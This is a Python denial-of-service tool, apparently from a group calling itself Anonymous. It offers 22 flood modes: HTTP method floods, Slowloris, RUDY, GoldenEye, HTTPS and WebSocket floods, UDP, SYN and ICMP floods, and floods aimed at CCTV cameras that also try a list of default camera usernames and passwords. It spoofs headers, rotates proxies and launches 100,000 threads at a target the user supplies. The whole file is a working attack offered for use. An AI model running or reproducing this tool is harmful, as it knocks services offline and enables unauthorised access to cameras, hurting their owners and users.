
print("‌")

import socket
import threading
import random
import time
import ssl
import base64
import sys
from colorama import Fore, Style, init

init(autoreset=True)


NUM_THREADS_PER_ATTACK = 100000
PACKET_SIZE = 9999
TIMEOUT = 3
PRINT_LOCK = threading.Lock()

REQUEST_COUNTER = 0
ERROR_COUNTER = 0


PROXIES = [    ]  #["ip:port:user:pass"] پروکسی اینجوری بزن 


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Dahua DVR",
    "Hikvision-Webs",
    "Axis Camera",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
]


CCTV_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "password"),
    ("admin", ""),
    ("root", "root"),
    ("service", "service"),
    ("supervisor", "supervisor"),
    ("guest", "guest"),
    ("operator", "operator"),
    ("tech", "tech")
]


ATTACK_METHODS = {
    "1": {"name": "HTTP GET Flood", "type": "HTTP", "method": "GET", "desc": "Standard GET request flood"},
    "2": {"name": "HTTP POST Flood", "type": "HTTP", "method": "POST", "desc": "Standard POST request flood"},
    "3": {"name": "HTTP PUT Flood", "type": "HTTP", "method": "PUT", "desc": "Standard PUT request flood"},
    "4": {"name": "HTTP DELETE Flood", "type": "HTTP", "method": "DELETE", "desc": "Standard DELETE request flood"},
    "5": {"name": "HTTP HEAD Flood", "type": "HTTP", "method": "HEAD", "desc": "Standard HEAD request flood"},
    "6": {"name": "HTTP OPTIONS Flood", "type": "HTTP", "method": "OPTIONS", "desc": "Standard OPTIONS request flood"},
    "7": {"name": "HTTP PATCH Flood", "type": "HTTP", "method": "PATCH", "desc": "Standard PATCH request flood"},
    "8": {"name": "HTTP TRACE Flood", "type": "HTTP", "method": "TRACE", "desc": "Standard TRACE request flood"},
    "9": {"name": "HTTP ALL Methods", "type": "HTTP", "method": "ALL", "desc": "Rotates through all HTTP methods"},
    "10": {"name": "Slowloris Attack", "type": "LAYER7", "method": "SLOWLORIS", "desc": "Slow HTTP headers attack"},
    "11": {"name": "RUDY Attack", "type": "LAYER7", "method": "RUDY", "desc": "Slow POST with large content-length"},
    "12": {"name": "GoldenEye Attack", "type": "LAYER7", "method": "GOLDENEYE", "desc": "Keep-alive with random headers"},
    "13": {"name": "HTTPS Flood", "type": "LAYER7", "method": "HTTPS", "desc": "SSL/TLS encrypted HTTP flood"},
    "14": {"name": "WebSocket Flood", "type": "LAYER7", "method": "WEBSOCKET", "desc": "WebSocket connection flood"},
    "15": {"name": "RTSP Flood", "type": "CCTV", "method": "RTSP", "desc": "Real Time Streaming Protocol flood"},
    "16": {"name": "ONVIF Discovery Flood", "type": "CCTV", "method": "ONVIF", "desc": "ONVIF device discovery flood"},
    "17": {"name": "Dahua Camera Flood", "type": "CCTV", "method": "DAHUA", "desc": "Dahua-specific camera requests"},
    "18": {"name": "Hikvision Camera Flood", "type": "CCTV", "method": "HIKVISION", "desc": "Hikvision-specific requests"},
    "19": {"name": "MJPEG Stream Flood", "type": "CCTV", "method": "MJPEG", "desc": "MJPEG video stream requests"},
    "20": {"name": "UDP Flood", "type": "LAYER4", "method": "UDP", "desc": "Raw UDP packet flood"},
    "21": {"name": "TCP SYN Flood", "type": "LAYER4", "method": "SYN", "desc": "TCP SYN packet flood"},
    "22": {"name": "ICMP Flood", "type": "LAYER4", "method": "ICMP", "desc": "ICMP ping flood"}
}

class ConsoleUtils:
    @staticmethod
    def clear_screen():
        
        print("\033[H\033[J", end="")
    
    @staticmethod
    def print_banner():
        
        print(f"{Fore.RED}                         WELCOM TO  DDOS ATTACK ")    
        print(f"{Fore.GREEN}                                    ")
        print("\n")

    @staticmethod
    def print_status(message, status_type="info"):
        
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "critical": Fore.RED + Style.BRIGHT
        }
        print(f"{colors.get(status_type, Fore.WHITE)}[•] {message}")

    @staticmethod
    def print_table(headers, rows):
        
        col_widths = [max(len(str(item)) for item in col) for col in zip(headers, *rows)]
        
        
        header_str = " │ ".join(f"{h:{w}}" for h, w in zip(headers, col_widths))
        print(f"{Fore.CYAN}┌─{'─┬─'.join('─' * w for w in col_widths)}─┐")
        print(f"{Fore.CYAN}│ {header_str} │")
        print(f"{Fore.CYAN}├─{'─┼─'.join('─' * w for w in col_widths)}─┤")
        
        
        for row in rows:
            row_str = " │ ".join(f"{str(item):{w}}" for item, w in zip(row, col_widths))
            print(f"{Fore.CYAN}│ {row_str} │")
        
        print(f"{Fore.CYAN}└─{'─┴─'.join('─' * w for w in col_widths)}─┘")

class TargetUtils:
    @staticmethod
    def clean_target(target):
        
        protocols = ("https://", "http://", "rtsp://", "ws://", "wss://")
        if target.startswith(protocols):
            target = target.split("//")[1]
        if target.startswith("www."):
            target = target[4:]
        return target.split("/")[0].split("@")[-1]

    @staticmethod
    def resolve_target(target):
        
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            ConsoleUtils.print_status("Error resolving domain! Check your target or network connection.", "error")
            exit()
        except Exception as e:
            ConsoleUtils.print_status(f"Critical resolution error: {str(e)}", "critical")
            exit()

class AttackUtils:
    @staticmethod
    def generate_dynamic_path():
        
        paths = [
            f"/{random.randint(1000,9999)}",
            f"/img/{random.randint(1,1000)}.jpg",
            f"/{random.choice(['admin','wp-login','api'])}?{random.randint(1,1000)}",
            "/live.sdp",
            "/onvif/device_service",
            "/Streaming/Channels/1",
            f"/{random_string(8)}.php",
            f"/api/v{random.randint(1,5)}/endpoint"
        ]
        return random.choice(paths)

    @staticmethod
    def generate_random_params():
        
        params = [
            f"?id={random.randint(1,100000)}",
            f"?search={random_string(10)}",
            f"?token={random.randint(1000000000,9999999999)}",
            "?channel=1&stream=0.sdp",
            "?resolution=640x480",
            f"?{random_string(5)}={random_string(8)}",
            f"?session={random.randint(100000,999999)}"
        ]
        return random.choice(params)

    @staticmethod
    def generate_http_flood_headers(method, is_cctv=False):
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive' if method in ["SLOWLORIS", "RUDY"] else 'close'
        }
        
        if is_cctv:
            headers.update({
                'Authorization': 'Basic ' + base64.b64encode(
                    f"{random.choice(CCTV_CREDENTIALS)[0]}:{random.choice(CCTV_CREDENTIALS)[1]}".encode()
                ).decode(),
                'CSeq': str(random.randint(1, 10000))
            })
        
        if method == "OPTIONS":
            for i in range(1, 50):
                headers[f'X-Custom-Header-{i}'] = random_string(10)
        
        if method in ["POST", "PUT", "PATCH"]:
            headers['Content-Type'] = random.choice([
                'application/x-www-form-urlencoded',
                'multipart/form-data',
                'application/json',
                'text/xml'
            ])
        
        if method == "PATCH":
            headers['Cookie'] = f'session_id={random_string(1000)}'
        
        if method == "TRACE":
            headers['Referer'] = random.choice([
                "https://google.com",
                "https://facebook.com",
                "https://twitter.com"
            ])
        
        return headers

    @staticmethod
    def create_ssl_connection(target_ip, target_port):
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
        ssl_sock.connect((target_ip, target_port))
        return ssl_sock

    @staticmethod
    def create_rtsp_request(target_ip, port, method):
        
        username, password = random.choice(CCTV_CREDENTIALS)
        auth_header = f"Authorization: Basic {base64.b64encode(f'{username}:{password}'.encode()).decode()}\r\n"
        
        requests = [
            f"OPTIONS rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\n{auth_header}\r\n",
            f"DESCRIBE rtsp://{target_ip}:{port}/live.sdp RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nAccept: application/sdp\r\n{auth_header}\r\n",
            f"SETUP rtsp://{target_ip}:{port}/trackID=1 RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nTransport: RTP/AVP;unicast;client_port={random.randint(2000,60000)}-{random.randint(2000,60000)}\r\n{auth_header}\r\n",
            f"PLAY rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nSession: {random.randint(100000,999999)}\r\n{auth_header}\r\n",
            f"TEARDOWN rtsp://{target_ip}:{port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 10000)}\r\nSession: {random.randint(100000,999999)}\r\n{auth_header}\r\n"
        ]
        return random.choice(requests)

    @staticmethod
    def create_onvif_request(target_ip, port):
        
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
            '<s:Body>'
            '<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
            '</s:Body>'
            '</s:Envelope>'
        )

    @staticmethod
    def create_dahua_request(target_ip, port):
        
        return (
            f"GET /cgi-bin/magicBox.cgi?action=getSystemInfo HTTP/1.1\r\n"
            f"Host: {target_ip}:{port}\r\n"
            f"User-Agent: Dahua DVR\r\n"
            f"Authorization: Basic {base64.b64encode(b'admin:admin').decode()}\r\n"
            f"\r\n"
        )

    @staticmethod
    def create_hikvision_request(target_ip, port):
        
        return (
            f"GET /ISAPI/System/deviceInfo HTTP/1.1\r\n"
            f"Host: {target_ip}:{port}\r\n"
            f"User-Agent: Hikvision-Webs\r\n"
            f"Authorization: Basic {base64.b64encode(b'admin:12345').decode()}\r\n"
            f"\r\n"
        )

    @staticmethod
    def create_mjpeg_request(target_ip, port):
        
        return (
            f"GET /video/mjpg.cgi HTTP/1.1\r\n"
            f"Host: {target_ip}:{port}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: keep-alive\r\n"
            f"Authorization: Basic {base64.b64encode(b'admin:admin').decode()}\r\n"
            f"\r\n"
        )

    @staticmethod
    def create_udp_packet():
        
        return bytes(random.getrandbits(8) for _ in range(PACKET_SIZE))

    @staticmethod
    def create_syn_packet(target_ip, target_port):
        
        packet = (
            b'\x00\x00' +  
            struct.pack('!H', target_port) +  
            struct.pack('!I', random.randint(0, 2**32 - 1)) +  
            b'\x00\x00\x00\x00' +  
            b'\x50\x02\x00\x00' +  
            b'\x00\x00' +  
            b'\x00\x00' +  
            b'\x00\x00'    
        )
        return packet

def random_string(length):
    
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(length))

class AttackLogger:
    @staticmethod
    def log_success(proxy, method, target_ip, status_code=None):
        
        global REQUEST_COUNTER
        REQUEST_COUNTER += 1
        status_part = f"{Fore.CYAN} {status_code}" if status_code else ""
        proxy_info = f"{Fore.MAGENTA} via {proxy}" if proxy else ""
        
        with PRINT_LOCK:
            print(f"{Fore.GREEN}[✓] {Fore.YELLOW}{method}{status_part} => {Fore.CYAN}{target_ip}{proxy_info} | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")

    @staticmethod
    def log_error(error_type, proxy=None, target_ip=None, status_code=None):
        
        global ERROR_COUNTER
        ERROR_COUNTER += 1
        
        error_messages = {
            '502': f"{Fore.RED}[✗] 502 Bad Gateway ({target_ip})",
            '503': f"{Fore.RED}[✗] 503 Service Unavailable ({target_ip})",
            '504': f"{Fore.RED}[✗] 504 Gateway Timeout ({target_ip})",
            '404': f"{Fore.RED}[✗] 404 Not Found ({target_ip})",
            '401': f"{Fore.RED}[✗] 401 Unauthorized ({target_ip})",
            'proxy': f"{Fore.RED}[✗] Proxy connection failed ({proxy})",
            'timeout': f"{Fore.RED}[✗] Connection timeout ({target_ip})",
            'refused': f"{Fore.RED}[✗] Connection refused ({target_ip})",
            'generic': f"{Fore.RED}[✗] Error: {error_type}"
        }
        
        with PRINT_LOCK:
            if status_code in error_messages:
                print(error_messages[status_code] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
            elif proxy and 'proxy' in error_type:
                print(error_messages['proxy'] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
            elif 'timed out' in error_type:
                print(error_messages['timeout'] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
            elif 'refused' in error_type:
                print(error_messages['refused'] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")
            else:
                print(error_messages['generic'] + f" | {Fore.WHITE}Total: {REQUEST_COUNTER} | {Fore.RED}Errors: {ERROR_COUNTER}")

def send_cctv_flood(target_ip, target_port, method):
    
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((target_ip, target_port))
            
            if method == "RTSP":
                request = AttackUtils.create_rtsp_request(target_ip, target_port, method)
            elif method == "ONVIF":
                request = AttackUtils.create_onvif_request(target_ip, target_port)
            elif method == "DAHUA":
                request = AttackUtils.create_dahua_request(target_ip, target_port)
            elif method == "HIKVISION":
                request = AttackUtils.create_hikvision_request(target_ip, target_port)
            elif method == "MJPEG":
                request = AttackUtils.create_mjpeg_request(target_ip, target_port)
            
            sock.send(request.encode())
            
            try:
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                if response:
                    if "RTSP/1.0" in response:
                        status_code = response.split(" ")[1]
                    elif "HTTP/1." in response:
                        status_code = response.split(" ")[1]
                    else:
                        status_code = "200"
                    
                    if status_code in ["401", "404", "503", "502"]:
                        AttackLogger.log_error('generic', target_ip=target_ip, status_code=status_code)
                    else:
                        AttackLogger.log_success(None, method, target_ip, status_code)
                else:
                    AttackLogger.log_success(None, method, target_ip, "No Response")
            except Exception as e:
                AttackLogger.log_success(None, method, target_ip, "No Response")
            
            time.sleep(0.1)
            
        except socket.timeout:
            AttackLogger.log_error('timeout', target_ip=target_ip)
        except ConnectionRefusedError:
            AttackLogger.log_error('refused', target_ip=target_ip)
        except Exception as e:
            error_msg = str(e).split("]", 1)[0] + "]" if "]" in str(e) else str(e)
            AttackLogger.log_error(error_msg[:50])
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def send_http_flood(target_ip, target_port, method, use_proxy=False):
    
    while True:
        sock = None
        proxy = random.choice(PROXIES) if use_proxy and PROXIES else None
        
        try:
            if method == "HTTPS":
                sock = AttackUtils.create_ssl_connection(target_ip, target_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
            
            if proxy:
                proxy_parts = proxy.split(":")
                proxy_ip = proxy_parts[0]
                proxy_port = int(proxy_parts[1])
                
                if len(proxy_parts) > 2:  
                    proxy_user = proxy_parts[2]
                    proxy_pass = proxy_parts[3] if len(proxy_parts) > 3 else ""
                    auth = base64.b64encode(f"{proxy_user}:{proxy_pass}".encode()).decode()
                    connect_request = (
                        f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n"
                        f"Host: {target_ip}:{target_port}\r\n"
                        f"Proxy-Authorization: Basic {auth}\r\n"
                        f"\r\n"
                    )
                else:  
                    connect_request = (
                        f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\n"
                        f"Host: {target_ip}:{target_port}\r\n"
                        f"\r\n"
                    )
                
                sock.connect((proxy_ip, proxy_port))
                sock.send(connect_request.encode())
                
                
                response = sock.recv(4096)
                if b"200" not in response:
                    raise Exception("Proxy connection failed")
            
            else:
                sock.connect((target_ip, target_port))
            
            
            http_method = method
            if method == "ALL":
                http_method = random.choice(["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE"])
            
            path = "/"
            if method in ["POST", "RUDY"]:
                path = AttackUtils.generate_dynamic_path()
            elif method in ["PUT", "GOLDENEYE"]:
                path = AttackUtils.generate_random_params()
            
            # Build request
            headers = AttackUtils.generate_http_flood_headers(method)
            
            if method == "SLOWLORIS":
                
                request = f"{http_method} {path} HTTP/1.1\r\nHost: {target_ip}\r\n"
                sock.send(request.encode())
                for key, value in headers.items():
                    sock.send(f"{key}: {value}\r\n".encode())
                    time.sleep(random.uniform(1, 5))
                
                time.sleep(60)
                continue
            elif method == "RUDY":
                
                headers['Content-Length'] = "1000000"
                request = (
                    f"{http_method} {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                )
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                sock.send(request.encode())
                
                while True:
                    sock.send(random_string(10).encode())
                    time.sleep(10)
            elif method == "GOLDENEYE":
                
                request = (
                    f"{http_method} {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                )
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                sock.send(request.encode())
                
                while True:
                    sock.send(f"X-a: {random.randint(1,1000)}\r\n".encode())
                    time.sleep(random.uniform(5, 10))
            elif method == "WEBSOCKET":
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {random_string(16)}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                )
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                sock.send(request.encode())
                
                while True:
                    time.sleep(1)
            else:
                
                request = (
                    f"{http_method} {path} HTTP/{random.choice(['1.0','1.1','2.0'])}\r\n"
                    f"Host: {target_ip}\r\n"
                )
                
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                
                if http_method in ["POST", "PUT", "PATCH"]:
                    request += f"Content-Length: {random.randint(1000,10000)}\r\n\r\n"
                    request += random_string(random.randint(1000,5000))
                else:
                    request += "\r\n"
                
                sock.send(request.encode())
            
            
            if method not in ["SLOWLORIS", "RUDY", "GOLDENEYE", "WEBSOCKET"]:
                try:
                    response = sock.recv(4096).decode('utf-8', errors='ignore')
                    if response:
                        status_code = response.split(" ")[1]
                        if status_code in ["502", "503", "504", "404"]:
                            AttackLogger.log_error('generic', target_ip=target_ip, status_code=status_code)
                        else:
                            AttackLogger.log_success(proxy, http_method, target_ip, status_code)
                    else:
                        AttackLogger.log_success(proxy, http_method, target_ip, "No Response")
                except Exception as e:
                    AttackLogger.log_success(proxy, http_method, target_ip, "No Response")
            
            
            if method not in ["SLOWLORIS", "RUDY", "GOLDENEYE", "WEBSOCKET"]:
                time.sleep(0.1)
            
        except socket.timeout:
            AttackLogger.log_error('timeout', target_ip=target_ip)
        except ConnectionRefusedError:
            AttackLogger.log_error('refused', target_ip=target_ip)
        except Exception as e:
            error_msg = str(e).split("]", 1)[0] + "]" if "]" in str(e) else str(e)
            if "proxy" in error_msg.lower():
                AttackLogger.log_error('proxy', proxy=proxy)
            else:
                AttackLogger.log_error(error_msg[:50])
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def send_layer4_flood(target_ip, target_port, method):
    
    while True:
        try:
            if method == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(AttackUtils.create_udp_packet(), (target_ip, target_port))
                AttackLogger.log_success(None, "UDP", target_ip)
            elif method == "SYN":
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.sendto(AttackUtils.create_syn_packet(target_ip, target_port), (target_ip, target_port))
                AttackLogger.log_success(None, "SYN", target_ip)
            elif method == "ICMP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(AttackUtils.create_udp_packet(), (target_ip, 0))
                AttackLogger.log_success(None, "ICMP", target_ip)
            
            time.sleep(0.01)
            
        except PermissionError:
            ConsoleUtils.print_status("Layer 4 attacks require root/admin privileges!", "error")
            exit()
        except Exception as e:
            AttackLogger.log_error(str(e))
        finally:
            if 'sock' in locals():
                try:
                    sock.close()
                except:
                    pass

def show_attack_methods():
    
    ConsoleUtils.print_status("Available Attack Methods:", "info")
    
    headers = ["ID", "Name", "Type", "Description"]
    rows = []
    
    for num, method in sorted(ATTACK_METHODS.items(), key=lambda x: int(x[0])):
        rows.append([
            Fore.YELLOW + num,
            Fore.CYAN + method["name"],
            Fore.GREEN + method["type"],
            Fore.WHITE + method["desc"]
        ])
    
    ConsoleUtils.print_table(headers, rows)

def select_attack_method():
    
    while True:
        try:
            choice = input(f"\n{Fore.YELLOW}Enter attack method ID: ").strip()
            if choice in ATTACK_METHODS:
                return ATTACK_METHODS[choice]
            ConsoleUtils.print_status("Invalid choice! Please select a valid number.", "error")
        except KeyboardInterrupt:
            ConsoleUtils.print_status("Attack canceled by user.", "warning")
            exit()

def get_target_info():
    
    try:
        target = input(f"{Fore.YELLOW}Enter target IP/Domain: ").strip()
        port = int(input(f"{Fore.YELLOW}Enter target port: ").strip())
        return target, port
    except ValueError:
        ConsoleUtils.print_status("Invalid port number!", "error")
        exit()
    except KeyboardInterrupt:
        ConsoleUtils.print_status("Input canceled by user.", "warning")
        exit()

def start_attack(target_ip, port, selected_method):
    
    ConsoleUtils.print_status(
        f"Starting {selected_method['name']} attack on {target_ip}:{port}", 
        "success"
    )
    
    threads = NUM_THREADS_PER_ATTACK * 2 if selected_method['method'] == "ALL" else NUM_THREADS_PER_ATTACK
    
    ConsoleUtils.print_status(f"Launching {threads} attack threads...", "info")
    
    for _ in range(threads):
        if selected_method['type'] == "CCTV":
            thread = threading.Thread(
                target=send_cctv_flood,
                args=(target_ip, port, selected_method['method']),
                daemon=True
            )
        elif selected_method['type'] == "LAYER4":
            thread = threading.Thread(
                target=send_layer4_flood,
                args=(target_ip, port, selected_method['method']),
                daemon=True
            )
        else:
            thread = threading.Thread(
                target=send_http_flood,
                args=(target_ip, port, selected_method['method'], bool(PROXIES)),
                daemon=True
            )
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ConsoleUtils.print_status("Attack stopped by user.", "warning")
        exit()

def main():
    
    ConsoleUtils.clear_screen()
    ConsoleUtils.print_banner()
    
    # ساخته شده توسط تیم انانیموس 
    target, port = get_target_info()
    target_ip = TargetUtils.resolve_target(TargetUtils.clean_target(target))
    
    
    show_attack_methods()
    selected_method = select_attack_method()
    
    
    start_attack(target_ip, port, selected_method)

if __name__ == "__main__":
    try:
        import struct  
        main()
    except KeyboardInterrupt:
        ConsoleUtils.print_status("Tool terminated by user.", "warning")
        exit()
    except Exception as e:
        ConsoleUtils.print_status(f"Critical error: {str(e)}", "critical")
     
     
#ANONYMOUS 